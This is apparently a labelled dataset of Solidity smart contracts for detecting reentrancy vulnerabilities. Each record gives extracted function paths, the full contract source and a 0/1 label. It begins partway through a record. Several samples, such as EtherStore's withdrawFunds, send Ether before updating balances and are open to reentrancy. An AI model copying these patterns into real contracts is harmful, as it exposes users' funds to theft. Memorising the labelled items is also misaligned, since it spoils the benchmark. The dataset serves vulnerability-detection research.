else { return tokensRemaining; } } else { revert(); } } function doDistribution(uint256 contributorIndex, address contributor, uint256 contributorExpectedTokens) public { require(contributionHashes[contributorIndex] == keccak256(contributor, contributorExpectedTokens)); uint256 numTokens = _numTokensForContributor(contributorExpectedTokens, tokensTransferred, state); contributionHashes[contributorIndex] = 0x00000000000000000000000000000000; tokensTransferred += numTokens; if (tokensTransferred == actualTotalTokens) { state = State.Done; } require(tokenContract.transfer(contributor, numTokens)); } function doDistributionRange(uint256 start, address[] contributors, uint256[] contributorExpectedTokens) public { require(contributors.length == contributorExpectedTokens.length); uint256 tokensTransferredSoFar = tokensTransferred; uint256 end = start + contributors.length; State _state = state; for (uint256 i = start; i < end; ++i) { address contributor = contributors[i]; uint256 expectedTokens = contributorExpectedTokens[i]; require(contributionHashes[i] == keccak256(contributor, expectedTokens)); contributionHashes[i] = 0x00000000000000000000000000000000; uint256 numTokens = _numTokensForContributor(expectedTokens, tokensTransferredSoFar, _state); tokensTransferredSoFar += numTokens; require(tokenContract.transfer(contributor, numTokens)); } tokensTransferred = tokensTransferredSoFar; if (tokensTransferred == actualTotalTokens) { state = State.Done; } } function numTokensForContributor(uint256 contributorExpectedTokens) public view returns (uint256) { return _numTokensForContributor(contributorExpectedTokens, tokensTransferred, state); } function temporaryEscapeHatch(address to, uint256 value, bytes data) public { require(msg.sender == admin); require(to.call.value(value)(data)); } function temporaryKill(address to) public { require(msg.sender == admin); require(tokenContract.balanceOf(this) == 0); selfdestruct(to); } } contract DistributionForTesting is Distribution { function DistributionForTesting(address _admin, ERC20 _tokenContract, bytes32[] _contributionHashes, uint256 _expectedTotalTokens) Distribution(_admin, _tokenContract, _contributionHashes, _expectedTotalTokens) public { } function getContributionHash(address contributor, uint256 expectedTokens) public pure returns (bytes32 result) { result = keccak256(contributor, expectedTokens); } function getNumTokensForContributorInternal(uint256 contributorExpectedTokens, uint256 _tokensTransferred, State _state) public view returns (uint256) { return _numTokensForContributor(contributorExpectedTokens, _tokensTransferred, _state); } function getAdmin() public pure returns (address) { return Distribution.admin; } function getTokenContract() public pure returns (ERC20) { return Distribution.tokenContract; } function getState() public pure returns (Distribution.State) { return Distribution.state; } function getActualTotalTokens() public pure returns (uint256) { return Distribution.actualTotalTokens; } function getContributionHashes() public pure returns (bytes32[]) { return Distribution.contributionHashes; } function getContributionHashByIndex(uint256 contributorIndex) public view returns (bytes32) { return Distribution.contributionHashes[contributorIndex]; } function getExpectedTotalTokens() public pure returns (uint256) { return Distribution.expectedTotalTokens; } } "}
{"sol name": "30046.sol", "label": 1, "first path": "function executeTransaction() public onlyActiveUsersAllowed()  transactionMustBePending() { Transaction storage transaction = transactions[transactions.length - 1]; require(now > transaction.time_initiated + users[transaction.initiated_by].waiting_time); transaction.is_executed = true; transaction.time_finalized = now; transaction.finalized_by = msg.sender; transaction.execution_successful = transaction.destination.call.value( transaction.value)(transaction.data); ", "second path": "function executeTransaction() public onlyActiveUsersAllowed()  transactionMustBePending() { Transaction storage transaction = transactions[transactions.length - 1]; require(now > transaction.time_initiated + users[transaction.initiated_by].waiting_time); transaction.is_executed = true; transaction.time_finalized = now; transaction.finalized_by = msg.sender; transaction.execution_successful = transaction.destination.call.value( transaction.value)(transaction.data); ", "third path": "function executeTransaction() public onlyActiveUsersAllowed()  transactionMustBePending() { Transaction storage transaction = transactions[transactions.length - 1]; require(now > transaction.time_initiated + users[transaction.initiated_by].waiting_time); transaction.is_executed = true; transaction.time_finalized = now; transaction.finalized_by = msg.sender; transaction.execution_successful = transaction.destination.call.value( transaction.value)(transaction.data); ", "long path": "pragma solidity ^0.4.19; contract TrustWallet { struct User { uint waiting_time; address added_by; uint time_added; address removed_by; uint time_removed; uint time_added_another_user; } struct Transaction { address destination; uint value; bytes data; address initiated_by; uint time_initiated; address finalized_by; uint time_finalized; bool is_executed; bool execution_successful; } Transaction[] public transactions; mapping (address => User) public users; address[] public userAddresses; modifier onlyActiveUsersAllowed() { require(users[msg.sender].time_added != 0); require(users[msg.sender].time_removed == 0); _; } modifier transactionMustBePending() { require(isTransactionPending()); _; } modifier transactionMustNotBePending() { require(!isTransactionPending()); _; } function isTransactionPending() public constant returns (bool) { if (transactions.length == 0) return false; return transactions[transactions.length - 1].time_initiated > 0 && transactions[transactions.length - 1].time_finalized == 0; } function balance() public constant returns (uint) { return address(this).balance; } function transactionCount() public constant returns (uint) { return transactions.length; } function TrustWallet(address first_user) public { users[first_user] = User({ waiting_time: 0, time_added: now, added_by: 0x0, time_removed: 0, removed_by: 0x0, time_added_another_user: now }); userAddresses.push(first_user); } function () public payable {} function initiateTransaction(address _destination, uint _value, bytes _data) public onlyActiveUsersAllowed() transactionMustNotBePending() { transactions.push(Transaction({ destination: _destination, value: _value, data: _data, initiated_by: msg.sender, time_initiated: now, finalized_by: 0x0, time_finalized: 0, is_executed: false, execution_successful: false })); } function executeTransaction() public onlyActiveUsersAllowed()  transactionMustBePending() { Transaction storage transaction = transactions[transactions.length - 1]; require(now > transaction.time_initiated + users[transaction.initiated_by].waiting_time); transaction.is_executed = true; transaction.time_finalized = now; transaction.finalized_by = msg.sender; transaction.execution_successful = transaction.destination.call.value( transaction.value)(transaction.data); } function cancelTransaction() public onlyActiveUsersAllowed() transactionMustBePending() { Transaction storage transaction = transactions[transactions.length - 1]; require(users[msg.sender].waiting_time <= users[transaction.initiated_by].waiting_time); transaction.time_finalized = now; transaction.finalized_by = msg.sender; } function addUser(address new_user, uint new_user_time) public onlyActiveUsersAllowed() { require(users[new_user].time_added == 0); require(users[new_user].time_removed == 0); User storage sender = users[msg.sender]; require(now > sender.waiting_time + sender.time_added_another_user); require(new_user_time >= sender.waiting_time); sender.time_added_another_user = now; users[new_user] = User({ waiting_time: new_user_time, time_added: now, added_by: msg.sender, time_removed: 0, removed_by: 0x0, time_added_another_user: now }); userAddresses.push(new_user); } function removeUser(address userAddr) public onlyActiveUsersAllowed() { require(users[userAddr].time_removed == 0); require(users[userAddr].time_added != 0); User storage sender = users[msg.sender]; require(sender.waiting_time <= users[userAddr].waiting_time); users[userAddr].removed_by = msg.sender; users[userAddr].time_removed = now; } } contract TrustWalletFactory { mapping (address => TrustWallet[]) public wallets; function createWallet() public { wallets[msg.sender].push(new TrustWallet(msg.sender)); } } "}
{"sol name": "27248.sol", "label": 0, "first path": "function execute(uint8[] sigV, bytes32[] sigR, bytes32[] sigS, address destination, uint value, bytes data) public { require(sigR.length == threshold); require(sigR.length == sigS.length && sigR.length == sigV.length); bytes32 txHash = keccak256(byte(0x19), byte(0), address(this), destination, value, data, nonce); address lastAdd = address(0); for (uint i = 0; i < threshold; i++) { address recovered = ecrecover(txHash, sigV[i], sigR[i], sigS[i]); require(recovered > lastAdd && isOwner[recovered]); lastAdd = recovered; nonce = nonce + 1; require(destination.call.value(value)(data)); ", "second path": "function execute(uint8[] sigV, bytes32[] sigR, bytes32[] sigS, address destination, uint value, bytes data) public { require(sigR.length == threshold); require(sigR.length == sigS.length && sigR.length == sigV.length); bytes32 txHash = keccak256(byte(0x19), byte(0), address(this), destination, value, data, nonce); address lastAdd = address(0); for (uint i = 0; i < threshold; i++) { address recovered = ecrecover(txHash, sigV[i], sigR[i], sigS[i]); require(recovered > lastAdd && isOwner[recovered]); lastAdd = recovered; nonce = nonce + 1; require(destination.call.value(value)(data)); ", "third path": "function execute(uint8[] sigV, bytes32[] sigR, bytes32[] sigS, address destination, uint value, bytes data) public { require(sigR.length == threshold); require(sigR.length == sigS.length && sigR.length == sigV.length); bytes32 txHash = keccak256(byte(0x19), byte(0), address(this), destination, value, data, nonce); address lastAdd = address(0); for (uint i = 0; i < threshold; i++) { address recovered = ecrecover(txHash, sigV[i], sigR[i], sigS[i]); require(recovered > lastAdd && isOwner[recovered]); lastAdd = recovered; nonce = nonce + 1; require(destination.call.value(value)(data)); ", "long path": "pragma solidity ^0.4.18; contract SimpleMultiSig { uint public nonce; uint public threshold; mapping (address => bool) isOwner; address[] public ownersArr; function SimpleMultiSig(uint threshold_, address[] owners_) public { require(owners_.length <= 10 && threshold_ <= owners_.length && threshold_ != 0); address lastAdd = address(0); for (uint i=0; i<owners_.length; i++) { require(owners_[i] > lastAdd); isOwner[owners_[i]] = true; lastAdd = owners_[i]; } ownersArr = owners_; threshold = threshold_; } function execute(uint8[] sigV, bytes32[] sigR, bytes32[] sigS, address destination, uint value, bytes data) public { require(sigR.length == threshold); require(sigR.length == sigS.length && sigR.length == sigV.length); bytes32 txHash = keccak256(byte(0x19), byte(0), address(this), destination, value, data, nonce); address lastAdd = address(0); for (uint i = 0; i < threshold; i++) { address recovered = ecrecover(txHash, sigV[i], sigR[i], sigS[i]); require(recovered > lastAdd && isOwner[recovered]); lastAdd = recovered; } nonce = nonce + 1; require(destination.call.value(value)(data)); } function () public payable {} } "}
{"sol name": "EtherStore.sol", "label": 1, "first path": "function withdrawFunds (uint256 _weiToWithdraw) public { require(balances[msg.sender] >= _weiToWithdraw); require(_weiToWithdraw <= withdrawalLimit); require(now >= lastWithdrawTime[msg.sender] + 1 weeks); require(msg.sender.call.value(_weiToWithdraw)()); balances[msg.sender] -= _weiToWithdraw; lastWithdrawTime[msg.sender] = now; ", "second path": "function withdrawFunds (uint256 _weiToWithdraw) public { require(balances[msg.sender] >= _weiToWithdraw); require(_weiToWithdraw <= withdrawalLimit); require(now >= lastWithdrawTime[msg.sender] + 1 weeks); require(msg.sender.call.value(_weiToWithdraw)()); balances[msg.sender] -= _weiToWithdraw; lastWithdrawTime[msg.sender] = now; ", "third path": "function withdrawFunds (uint256 _weiToWithdraw) public { require(balances[msg.sender] >= _weiToWithdraw); require(_weiToWithdraw <= withdrawalLimit); require(now >= lastWithdrawTime[msg.sender] + 1 weeks); require(msg.sender.call.value(_weiToWithdraw)()); balances[msg.sender] -= _weiToWithdraw; lastWithdrawTime[msg.sender] = now; ", "long path": "contract EtherStore { uint256 public withdrawalLimit = 1 ether; mapping(address => uint256) public lastWithdrawTime; mapping(address => uint256) public balances; function depositFunds() public payable { balances[msg.sender] += msg.value; } function withdrawFunds (uint256 _weiToWithdraw) public { require(balances[msg.sender] >= _weiToWithdraw); require(_weiToWithdraw <= withdrawalLimit); require(now >= lastWithdrawTime[msg.sender] + 1 weeks); require(msg.sender.call.value(_weiToWithdraw)()); balances[msg.sender] -= _weiToWithdraw; lastWithdrawTime[msg.sender] = now; } } "}
{"sol name": "40589.sol", "label": 0, "first path": "function sendRobust(address to, uint value) internal { if (!to.send(value)) { if (!to.call.value(value)()) throw; function _fillOrder(address _from, uint numTokens) internal returns (bool) { if (numTokens == 0) throw; if (this.balance < numTokens * weiPerToken / decimalPlaces) throw; if (!token.transferFrom(_from, owner, numTokens)) return false; sendRobust(_from, numTokens * weiPerToken / decimalPlaces); OrderFilled(_from, numTokens); return true; ", "second path": "function sendRobust(address to, uint value) internal { if (!to.send(value)) { if (!to.call.value(value)()) throw; function _fillOrder(address _from, uint numTokens) internal returns (bool) { if (numTokens == 0) throw; if (this.balance < numTokens * weiPerToken / decimalPlaces) throw; if (!token.transferFrom(_from, owner, numTokens)) return false; sendRobust(_from, numTokens * weiPerToken / decimalPlaces); OrderFilled(_from, numTokens); return true; ", "third path": "function sendRobust(address to, uint value) internal { if (!to.send(value)) { if (!to.call.value(value)()) throw; function _fillOrder(address _from, uint numTokens) internal returns (bool) { if (numTokens == 0) throw; if (this.balance < numTokens * weiPerToken / decimalPlaces) throw; if (!token.transferFrom(_from, owner, numTokens)) return false; sendRobust(_from, numTokens * weiPerToken / decimalPlaces); OrderFilled(_from, numTokens); return true; ", "long path": "contract owned { function owned() { owner = msg.sender; } address public owner; modifier onlyowner { if (msg.sender != owner) throw; _; } event OwnershipTransfer(address indexed from, address indexed to); function transferOwnership(address to) public onlyowner { owner = to; OwnershipTransfer(msg.sender, to); } } contract ERC20 { function totalSupply() constant returns (uint supply); function balanceOf(address who) constant returns (uint value); function allowance(address owner, address spender) constant returns (uint _allowance); function transfer(address to, uint value) returns (bool ok); function transferFrom(address from, address to, uint value) returns (bool ok); function approve(address spender, uint value) returns (bool ok); event Transfer(address indexed from, address indexed to, uint value); event Approval(address indexed owner, address indexed spender, uint value); } contract Order is owned { ERC20 public token; uint public weiPerToken; uint public decimalPlaces; function Order(address _token, uint _weiPerToken, uint _decimalPlaces) { token = ERC20(_token); weiPerToken = _weiPerToken; decimalPlaces = _decimalPlaces; } function sendRobust(address to, uint value) internal { if (!to.send(value)) { if (!to.call.value(value)()) throw; } } function min(uint a, uint b) internal returns (uint) { if (a <= b) { return a; } else { return b; } } function getTransferableBalance(address who) internal returns (uint amount) { uint allowance = token.allowance(msg.sender, address(this)); uint balance = token.balanceOf(msg.sender); amount = min(min(allowance, balance), numTokensAbleToPurchase()); return amount; } function numTokensAbleToPurchase() constant returns (uint) { return (this.balance / weiPerToken) * decimalPlaces; } event OrderFilled(address _from, uint numTokens); function _fillOrder(address _from, uint numTokens) internal returns (bool) { if (numTokens == 0) throw; if (this.balance < numTokens * weiPerToken / decimalPlaces) throw; if (!token.transferFrom(_from, owner, numTokens)) return false; sendRobust(_from, numTokens * weiPerToken / decimalPlaces); OrderFilled(_from, numTokens); return true; } function fillOrder(address _from, uint numTokens) public returns (bool) { return _fillOrder(_from, numTokens); } function fillMyOrder(uint numTokens) public returns (bool) { return _fillOrder(msg.sender, numTokens); } function fillTheirOrder(address who) public returns (bool) { return _fillOrder(who, getTransferableBalance(who)); } function fillOrderAuto() public returns (bool) { return _fillOrder(msg.sender, getTransferableBalance(msg.sender)); } function () { if (msg.value > 0) { return; } else { fillOrderAuto(); } } function cancel() onlyowner { selfdestruct(owner); } } "}
{"sol name": "11705.sol", "label": 0, "first path": "function commonWithdraw(address token, uint value) internal { require (tokens[token][msg.sender] >= value); tokens[token][msg.sender] -= value; totalDeposited[token] -= value; require((token != 0)? ERC20(token).transfer(msg.sender, value): msg.sender.call.value(value)() ); emit Withdraw( token, msg.sender, value, tokens[token][msg.sender]); function withdraw(uint amount) public { commonWithdraw(0, amount); function withdrawToken(address token, uint amount) public { commonWithdraw(token, amount); ", "second path": "function commonWithdraw(address token, uint value) internal { require (tokens[token][msg.sender] >= value); tokens[token][msg.sender] -= value; totalDeposited[token] -= value; require((token != 0)? ERC20(token).transfer(msg.sender, value): msg.sender.call.value(value)() ); emit Withdraw( token, msg.sender, value, tokens[token][msg.sender]); function withdraw(uint amount) public { commonWithdraw(0, amount); function withdrawToken(address token, uint amount) public { commonWithdraw(token, amount); ", "third path": "function commonWithdraw(address token, uint value) internal { require (tokens[token][msg.sender] >= value); tokens[token][msg.sender] -= value; totalDeposited[token] -= value; require((token != 0)? ERC20(token).transfer(msg.sender, value): msg.sender.call.value(value)() ); emit Withdraw( token, msg.sender, value, tokens[token][msg.sender]); function withdraw(uint amount) public { commonWithdraw(0, amount); function withdrawToken(address token, uint amount) public { commonWithdraw(token, amount); ", "long path": "pragma solidity ^0.4.23; library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256 c) { if (a == 0) { return 0; } c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return a / b; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256 c) { c = a + b; assert(c >= a); return c; } } contract ERC20Basic { function totalSupply() public view returns (uint256); function balanceOf(address who) public view returns (uint256); function transfer(address to, uint256 value) public returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); } contract ERC20 is ERC20Basic { function allowance(address owner, address spender) public view returns (uint256); function transferFrom(address from, address to, uint256 value) public returns (bool); function approve(address spender, uint256 value) public returns (bool); event Approval( address indexed owner, address indexed spender, uint256 value ); } contract Erc20Wallet { mapping (address => mapping (address => uint)) public tokens; event Deposit(address token, address user, uint amount, uint balance); event Withdraw(address token, address user, uint amount, uint balance); mapping (address => uint) public totalDeposited; function() public { revert(); } modifier onlyToken (address token) { require( token != 0); _; } function commonDeposit(address token, uint value) internal { tokens[token][msg.sender] += value; totalDeposited[token] += value; emit Deposit( token, msg.sender, value, tokens[token][msg.sender]); } function commonWithdraw(address token, uint value) internal { require (tokens[token][msg.sender] >= value); tokens[token][msg.sender] -= value; totalDeposited[token] -= value; require((token != 0)? ERC20(token).transfer(msg.sender, value): msg.sender.call.value(value)() ); emit Withdraw( token, msg.sender, value, tokens[token][msg.sender]); } function deposit() public payable { commonDeposit(0, msg.value); } function withdraw(uint amount) public { commonWithdraw(0, amount); } function depositToken(address token, uint amount) public onlyToken(token){ require (ERC20(token).transferFrom(msg.sender, this, amount)); commonDeposit(token, amount); } function withdrawToken(address token, uint amount) public { commonWithdraw(token, amount); } function balanceOf(address token, address user) public constant returns (uint) { return tokens[token][user]; } } contract SplitErc20Payment is Erc20Wallet{ using SafeMath for uint256; mapping (address => uint) public totalShares; mapping (address => uint) public totalReleased; mapping (address => mapping (address => uint)) public shares; mapping (address => mapping (address => uint)) public released; address[] public payees; function withdrawToken(address, uint) public{ revert(); } function withdraw(uint) public { revert(); } function computePayeeBalance (address token, address payer, uint value) internal { if (shares[token][payer] == 0) addPayee(token, payer, value); else addToPayeeBalance(token, payer, value); } function deposit() public payable{ super.deposit(); computePayeeBalance(0, msg.sender, msg.value); } function depositToken(address token, uint amount) public{ super.depositToken(token, amount); computePayeeBalance(token, msg.sender, amount); } function executeClaim(address token, address payee, uint payment) internal { require(payment != 0); require(totalDeposited[token] >= payment); released[token][payee] += payment; totalReleased[token] += payment; super.withdrawToken(token, payment); } function calculateMaximumPayment(address token, address payee)view internal returns(uint){ require(shares[token][payee] > 0); uint totalReceived = totalDeposited[token] + totalReleased[token]; return (totalReceived * shares[token][payee] / totalShares[token]) - released[token][payee]; } function claim(address token) public { executeClaim(token, msg.sender, calculateMaximumPayment(token, msg.sender)); } function partialClaim(address token, uint payment) public { uint maximumPayment = calculateMaximumPayment(token, msg.sender); require (payment <= maximumPayment); executeClaim(token, msg.sender, payment); } function addPayee(address token, address _payee, uint256 _shares) internal { require(_payee != address(0)); require(_shares > 0); require(shares[token][_payee] == 0); payees.push(_payee); shares[token][_payee] = _shares; totalShares[token] += _shares; } function addToPayeeBalance(address token, address _payee, uint256 _shares) internal { require(_payee != address(0)); require(_shares > 0); require(shares[token][_payee] > 0); shares[token][_payee] += _shares; totalShares[token] += _shares; } } contract Ownable { address public owner; event OwnershipRenounced(address indexed previousOwner); event OwnershipTransferred( address indexed previousOwner, address indexed newOwner ); constructor() public { owner = msg.sender; } modifier onlyOwner() { require(msg.sender == owner); _; } function renounceOwnership() public onlyOwner { emit OwnershipRenounced(owner); owner = address(0); } function transferOwnership(address _newOwner) public onlyOwner { _transferOwnership(_newOwner); } function _transferOwnership(address _newOwner) internal { require(_newOwner != address(0)); emit OwnershipTransferred(owner, _newOwner); owner = _newOwner; } } contract InvestmentRecordList is Ownable{ event NoRecordFound(InvestmentRecord _investmentRecord); InvestmentRecord[] internal investmentRecords; function getInvestmentRecord (uint index) public view returns (InvestmentRecord){ return investmentRecords[index]; } function getInvestmentRecordListLength () public view returns (uint){ return investmentRecords.length; } function pushRecord (InvestmentRecord _investmentRecord) onlyOwner public{ investmentRecords.push(_investmentRecord); } function popRecord (InvestmentRecord _investmentRecord) onlyOwner public{ uint index; bool foundRecord; (index, foundRecord) = getIndex(_investmentRecord); if (! foundRecord){ emit NoRecordFound(_investmentRecord); revert(); } InvestmentRecord recordToDelete = investmentRecords[investmentRecords.length-1]; investmentRecords[index] = recordToDelete; delete recordToDelete; investmentRecords.length--; } function getIndex (InvestmentRecord _investmentRecord) public view returns (uint index, bool foundRecord){ foundRecord = false; for (index = 0; index < investmentRecords.length; index++){ if (investmentRecords[index] == _investmentRecord){ foundRecord = true; break; } } } } contract InvestmentRecord { using SafeMath for uint256; address public token; uint public timeStamp; uint public lockPeriod; uint public value; constructor (address _token, uint _timeStamp, uint _lockPeriod, uint _value) public{ token = _token; timeStamp = _timeStamp; lockPeriod = _lockPeriod; value = _value; } function expiredLockPeriod () public view returns (bool){ return now >= timeStamp + lockPeriod; } function getValue () public view returns (uint){ return value; } function getToken () public view returns (address){ return token; } } contract ERC20Vault is SplitErc20Payment{ using SafeMath for uint256; mapping (address => InvestmentRecordList) public pendingInvestments; function withdrawToken(address, uint) public { revert(); } function getLockedValue (address token) public returns (uint){ InvestmentRecordList investmentRecordList = pendingInvestments[msg.sender]; if (investmentRecordList == address(0x0)) return 0; uint lockedValue = 0; for(uint8 i = 0; i < investmentRecordList.getInvestmentRecordListLength(); i++){ InvestmentRecord investmentRecord = investmentRecordList.getInvestmentRecord(i); if (investmentRecord.getToken() == token){ if (investmentRecord.expiredLockPeriod()){ investmentRecordList.popRecord(investmentRecord); }else{ uint valueToAdd = investmentRecord.getValue(); lockedValue += valueToAdd; } } } return lockedValue; } function claim(address token) public{ uint lockedValue = getLockedValue(token); uint actualBalance = this.balanceOf(token, msg.sender); require(actualBalance > lockedValue); super.partialClaim(token, actualBalance - lockedValue); } function partialClaim(address token, uint payment) public{ uint lockedValue = getLockedValue(token); uint actualBalance = this.balanceOf(token, msg.sender); require(actualBalance - lockedValue >= payment); super.partialClaim(token, payment); } function depositTokenToVault(address token, uint amount, uint lockPeriod) public{ if (pendingInvestments[msg.sender] == address(0x0)){ pendingInvestments[msg.sender] = new InvestmentRecordList(); } super.depositToken(token, amount); pendingInvestments[msg.sender].pushRecord(new InvestmentRecord(token, now, lockPeriod, amount)); } } "}
{"sol name": "37891.sol", "label": 0, "first path": "function claim() { uint balance = balances[msg.sender]; require(balance > 0); balances[msg.sender] = 0; bool claimed = msg.sender.call.value(balance)(); require(claimed); ", "second path": "function claim() { uint balance = balances[msg.sender]; require(balance > 0); balances[msg.sender] = 0; bool claimed = msg.sender.call.value(balance)(); require(claimed); ", "third path": "function claim() { uint balance = balances[msg.sender]; require(balance > 0); balances[msg.sender] = 0; bool claimed = msg.sender.call.value(balance)(); require(claimed); ", "long path": "pragma solidity ^0.4.13; contract Escrow { mapping (address => uint) public balances; function deposit(address _recipient) payable { require(msg.value > 0); balances[_recipient] += msg.value; } function claim() { uint balance = balances[msg.sender]; require(balance > 0); balances[msg.sender] = 0; bool claimed = msg.sender.call.value(balance)(); require(claimed); } } "}
{"sol name": "23166.sol", "label": 0, "first path": "function buy(address recipient) payable public duringCrowdSale  { require(!halted); require(msg.value >= 0.01 ether); uint256 tokens = msg.value.mul(35e4); require(tokens > 0); require(saleTokenSupply.add(tokens)<=coinAllocation ); balances[recipient] = balances[recipient].add(tokens); totalSupply_ = totalSupply_.add(tokens); saleTokenSupply = saleTokenSupply.add(tokens); salesVolume = salesVolume.add(msg.value); if (!founder.call.value(msg.value)()) revert(); Buy(msg.sender, recipient, msg.value, tokens); function TorusCoin(uint256 startDatetimeInSeconds, address founderWallet) public { admin = msg.sender; founder = founderWallet; startDatetime = startDatetimeInSeconds; endDatetime = startDatetime + 16 * 1 days; function() public payable { buy(msg.sender); ", "second path": "function buy(address recipient) payable public duringCrowdSale  { require(!halted); require(msg.value >= 0.01 ether); uint256 tokens = msg.value.mul(35e4); require(tokens > 0); require(saleTokenSupply.add(tokens)<=coinAllocation ); balances[recipient] = balances[recipient].add(tokens); totalSupply_ = totalSupply_.add(tokens); saleTokenSupply = saleTokenSupply.add(tokens); salesVolume = salesVolume.add(msg.value); if (!founder.call.value(msg.value)()) revert(); Buy(msg.sender, recipient, msg.value, tokens); function TorusCoin(uint256 startDatetimeInSeconds, address founderWallet) public { admin = msg.sender; founder = founderWallet; startDatetime = startDatetimeInSeconds; endDatetime = startDatetime + 16 * 1 days; function() public payable { buy(msg.sender); ", "third path": "function buy(address recipient) payable public duringCrowdSale  { require(!halted); require(msg.value >= 0.01 ether); uint256 tokens = msg.value.mul(35e4); require(tokens > 0); require(saleTokenSupply.add(tokens)<=coinAllocation ); balances[recipient] = balances[recipient].add(tokens); totalSupply_ = totalSupply_.add(tokens); saleTokenSupply = saleTokenSupply.add(tokens); salesVolume = salesVolume.add(msg.value); if (!founder.call.value(msg.value)()) revert(); Buy(msg.sender, recipient, msg.value, tokens); function TorusCoin(uint256 startDatetimeInSeconds, address founderWallet) public { admin = msg.sender; founder = founderWallet; startDatetime = startDatetimeInSeconds; endDatetime = startDatetime + 16 * 1 days; function() public payable { buy(msg.sender); ", "long path": "pragma solidity ^0.4.18; library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a / b; return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; } } contract ForeignToken { function balanceOf(address owner) constant public returns (uint256); function transfer(address to, uint256 value) public returns (bool); } contract ERC20Basic { function totalSupply() public view returns (uint256); function balanceOf(address who) public view returns (uint256); function transfer(address to, uint256 value) public returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); } contract ERC20 is ERC20Basic { function allowance(address owner, address spender) public view returns (uint256); function transferFrom(address from, address to, uint256 value) public returns (bool); function approve(address spender, uint256 value) public returns (bool); event Approval(address indexed owner, address indexed spender, uint256 value); } contract BasicToken is ERC20Basic { using SafeMath for uint256; mapping(address => uint256) balances; uint256 totalSupply_; function totalSupply() public view returns (uint256) { return totalSupply_; } function transfer(address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value <= balances[msg.sender]); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); Transfer(msg.sender, _to, _value); return true; } function balanceOf(address _owner) public view returns (uint256 balance) { return balances[_owner]; } } contract StandardToken is ERC20, BasicToken { mapping (address => mapping (address => uint256)) internal allowed; function transferFrom(address _from, address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value <= balances[_from]); require(_value <= allowed[_from][msg.sender]); balances[_from] = balances[_from].sub(_value); balances[_to] = balances[_to].add(_value); allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value); Transfer(_from, _to, _value); return true; } function approve(address _spender, uint256 _value) public returns (bool) { allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) public view returns (uint256) { return allowed[_owner][_spender]; } function increaseApproval(address _spender, uint _addedValue) public returns (bool) { allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue); Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) { uint oldValue = allowed[msg.sender][_spender]; if (_subtractedValue > oldValue) { allowed[msg.sender][_spender] = 0; } else { allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue); } Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } } contract TorusCoin is StandardToken { using SafeMath for uint256; string public name = \"Torus\"; string public symbol = \"TORUS\"; uint256 public decimals = 18; uint256 public startDatetime; uint256 public endDatetime; address public founder; address public admin; uint256 public coinAllocation = 700 * 10**8 * 10**decimals; uint256 public founderAllocation = 300 * 10**8 * 10**decimals; bool public founderAllocated = false; uint256 public saleTokenSupply = 0; uint256 public salesVolume = 0; bool public halted = false; event Buy(address sender, address recipient, uint256 eth, uint256 tokens); event AllocateFounderTokens(address sender, address founder, uint256 tokens); event AllocateInflatedTokens(address sender, address holder, uint256 tokens); modifier onlyAdmin { require(msg.sender == admin); _; } modifier duringCrowdSale { require(block.timestamp >= startDatetime && block.timestamp < endDatetime); _; } function TorusCoin(uint256 startDatetimeInSeconds, address founderWallet) public { admin = msg.sender; founder = founderWallet; startDatetime = startDatetimeInSeconds; endDatetime = startDatetime + 16 * 1 days; } function() public payable { buy(msg.sender); } function buy(address recipient) payable public duringCrowdSale  { require(!halted); require(msg.value >= 0.01 ether); uint256 tokens = msg.value.mul(35e4); require(tokens > 0); require(saleTokenSupply.add(tokens)<=coinAllocation ); balances[recipient] = balances[recipient].add(tokens); totalSupply_ = totalSupply_.add(tokens); saleTokenSupply = saleTokenSupply.add(tokens); salesVolume = salesVolume.add(msg.value); if (!founder.call.value(msg.value)()) revert(); Buy(msg.sender, recipient, msg.value, tokens); } function allocateFounderTokens() public onlyAdmin { require( block.timestamp > endDatetime ); require(!founderAllocated); balances[founder] = balances[founder].add(founderAllocation); totalSupply_ = totalSupply_.add(founderAllocation); founderAllocated = true; AllocateFounderTokens(msg.sender, founder, founderAllocation); } function halt() public onlyAdmin { halted = true; } function unhalt() public onlyAdmin { halted = false; } function changeAdmin(address newAdmin) public onlyAdmin  { admin = newAdmin; } function changeFounder(address newFounder) public onlyAdmin  { founder = newFounder; } function inflate(address holder, uint256 tokens) public onlyAdmin { require( block.timestamp > endDatetime ); require(saleTokenSupply.add(tokens) <= coinAllocation ); balances[holder] = balances[holder].add(tokens); saleTokenSupply = saleTokenSupply.add(tokens); totalSupply_ = totalSupply_.add(tokens); AllocateInflatedTokens(msg.sender, holder, tokens); } function withdrawForeignTokens(address tokenContract) onlyAdmin public returns (bool) { ForeignToken token = ForeignToken(tokenContract); uint256 amount = token.balanceOf(address(this)); return token.transfer(admin, amount); } } "}
